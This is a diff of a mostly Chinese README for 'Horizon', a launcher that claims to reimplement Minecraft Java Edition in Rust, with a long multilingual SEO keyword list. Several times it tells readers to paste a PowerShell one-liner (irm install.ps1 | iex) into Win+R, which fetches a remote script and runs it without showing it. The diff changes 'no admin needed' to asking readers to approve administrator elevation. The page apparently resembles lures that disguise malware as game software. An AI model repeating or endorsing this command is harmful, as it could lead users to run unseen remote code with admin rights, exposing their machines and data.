@@ -12,7 +12,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 2. **粘贴.** Ctrl+V — 粘贴下面的命令。
 3. **回车.** Horizon 下载、安装并打开 — 然后「准备」→「开始游戏」。
 
-<p align="center">不需要管理员权限。若 Windows 询问 PowerShell，请确认。该命令只从 horizonlauncher.net 获取 `install.ps1`。</p>
+<p align="center">安装程序和启动器以管理员身份 (UAC) 运行 — 请确认 Windows 提示。该命令只从 horizonlauncher.net 获取 `install.ps1`。</p>
 
 <p align="center">
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>普通安装 — 下载 Horizon setup.exe</strong></a>
@@ -192,7 +192,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 2. **粘贴.** Ctrl+V — 粘贴下面的命令。
 3. **回车.** Horizon 下载、安装并打开 — 然后「准备」→「开始游戏」。
 
-不需要管理员权限。若 Windows 询问 PowerShell，请确认。该命令只从 horizonlauncher.net 获取 `install.ps1`。
+安装程序和启动器以管理员身份 (UAC) 运行 — 请确认 Windows 提示。该命令只从 horizonlauncher.net 获取 `install.ps1`。
 
 完整教程： [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
 
@@ -213,31 +213,27 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 - Windows x64 · GPU DX12 / Vulkan · 磁盘上任意 Minecraft 版本
 
 
-## Horizon Minecraft features (Java client in Rust)
+## Horizon Minecraft 功能（Rust 重写的 Java 客户端）
 
-**Horizon** reimplements **Minecraft: Java Edition 26.3** in **Rust**: same worlds, rules and terrain, native rendering instead of the JVM. Install via the **Horizon launcher** from **[horizonlauncher.net](https://horizonlauncher.net/en/)**.
+**Horizon** 用 **Rust** 重写 **Minecraft: Java Edition 26.3**：相同世界与规则，原生渲染取代 JVM。请仅从 **[horizonlauncher.net](https://horizonlauncher.net/zh/)** 下载启动器。
 
-| Search intent | Keywords | Canonical URL |
-|---------------|----------|---------------|
-| Download | download Horizon, Horizon setup exe, Win+R install | [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) |
-| Performance | Minecraft on Rust, higher FPS Java, Rust Minecraft client | [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/) |
-| Mods | Distant Horizons, Create, Horizon shaders | [https://horizonlauncher.net/en/distant-horizons/](https://horizonlauncher.net/en/distant-horizons/) · [https://horizonlauncher.net/en/create-mod/](https://horizonlauncher.net/en/create-mod/) · [https://horizonlauncher.net/en/shaders/](https://horizonlauncher.net/en/shaders/) |
-| Multiplayer | Java servers, LAN | [https://horizonlauncher.net/en/server/](https://horizonlauncher.net/en/server/) |
-| Legal | LGPL, unofficial | [https://horizonlauncher.net/en/legal/](https://horizonlauncher.net/en/legal/) |
+| 搜索意图 | 页面 |
+|----------|------|
+| 下载 Horizon、Win+R | [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/) |
+| Rust 版 Minecraft、更高 FPS | [https://horizonlauncher.net/zh/minecraft-rust/](https://horizonlauncher.net/zh/minecraft-rust/) · [https://horizonlauncher.net/zh/performance/](https://horizonlauncher.net/zh/performance/) |
+| Distant Horizons、Create、光影 | [https://horizonlauncher.net/zh/distant-horizons/](https://horizonlauncher.net/zh/distant-horizons/) · [https://horizonlauncher.net/zh/create-mod/](https://horizonlauncher.net/zh/create-mod/) · [https://horizonlauncher.net/zh/shaders/](https://horizonlauncher.net/zh/shaders/) |
+| 多人 | [https://horizonlauncher.net/zh/server/](https://horizonlauncher.net/zh/server/) |
+| LGPL | [https://horizonlauncher.net/zh/legal/](https://horizonlauncher.net/zh/legal/) |
 
-### Parity and FPS
+### 一致性与 FPS
 
-Upstream uses **hundreds of differential harnesses** comparing vanilla Java and Horizon Rust on identical inputs. Search **download Horizon Minecraft** for **higher FPS** than the JVM client.
+数百个 **differential harnesses** 对比原版 Java 与 Horizon Rust。
 
-### In-game highlights
+### 游戏内
 
-Singleplayer & LAN, **LOD** terrain, gamepads, native **`.hnmod`** mods, **shader API 0.2**, **LGPL** from 0.2.69.
+单人、LAN、**LOD** 远景、手柄、原生 **`.hnmod`** 模组、**shader API 0.2**、**LGPL**（0.2.69 起）。[https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
-### Recent launcher patches
-
-**0.2.69** LGPL · **0.2.68** UX · **0.2.67** shader API 0.2 · **0.2.66–0.2.65** networking & downloads. Notes: [https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases).
-
-Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · setup: **[horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)**
+Win+R：`irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)**
 
 ## 为什么用 Rust 写 Minecraft
 
@@ -264,6 +260,15 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · setup: **[horizon-
 **需要 Java 吗？**  
 Horizon 的 Rust 客户端不需要。
 
+**什么许可证？**  
+从 **0.2.69** 起，Horizon 上游为 **LGPL-3.0-or-later**。[https://horizonlauncher.net/zh/legal/](https://horizonlauncher.net/zh/legal/)
+
+**Distant Horizons、Create 和光影？**  
+支持 — 原生模组 (.hnmod)。[https://horizonlauncher.net/zh/distant-horizons/](https://horizonlauncher.net/zh/distant-horizons/) · [Create](https://horizonlauncher.net/zh/create-mod/) · [光影](https://horizonlauncher.net/zh/shaders/)
+
+**0.2.65–0.2.69 更新？**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 启动器 **0.2.69** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/)
+
 ## 网站全部页面
 
 - [首页](https://horizonlauncher.net/en/)
@@ -279,7 +284,7 @@ Horizon 的 Rust 客户端不需要。
 
 ## SEO 标签与搜索词
 
-`下载 Horizon` `Horizon 启动器` `Rust 版 Minecraft` `Minecraft Rust Edition` `Minecraft 高帧率` `horizonlauncher.net` `download Horizon` `Win+R Horizon` `Horizon Win+R install` `Horizon setup.exe`
+`下载 Horizon` `Horizon 启动器` `Rust 版 Minecraft` `Minecraft Rust Edition` `Minecraft 高帧率` `horizonlauncher.net` `download Horizon` `Win+R Horizon` `Horizon 快速安装` `Horizon 安装包` `下载 Horizon` `Distant Horizons Horizon` `Create 模组 Horizon` `光影 Horizon` `LGPL Horizon` `Horizon 0.2.69` `Minecraft Rust 客户端`
 
 `скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.69` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.54` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
 
